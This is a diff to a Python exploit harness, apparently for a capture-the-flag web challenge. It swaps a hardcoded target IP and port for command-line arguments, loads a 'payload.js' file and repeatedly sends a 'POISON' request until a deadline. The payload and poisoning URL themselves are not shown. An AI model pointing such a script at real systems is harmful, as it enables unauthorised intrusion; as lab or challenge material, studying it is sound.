@@ -1,7 +1,11 @@
 import os, re, sys, time, urllib.parse
 import requests
 
-BASE = "http://154.57.164.81:35113"
+if len(sys.argv) not in (3, 4):
+    print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port> [seconds]")
+    sys.exit(1)
+
+BASE = f"http://{sys.argv[1]}:{int(sys.argv[2])}"
 HERE = os.path.dirname(os.path.abspath(__file__))
 JS = open(os.path.join(HERE, "payload.js")).read()
 
@@ -19,7 +23,7 @@ POISON = (
 )
 TAGS = ["S0", "S1", "S2", "S3", "S4", "F", "ERR"]
 
-deadline = time.time() + (int(sys.argv[1]) if len(sys.argv) > 1 else 180)
+deadline = time.time() + (int(sys.argv[3]) if len(sys.argv) == 4 else 180)
 seen = {}
 while time.time() < deadline:
     requests.get(POISON, timeout=30)
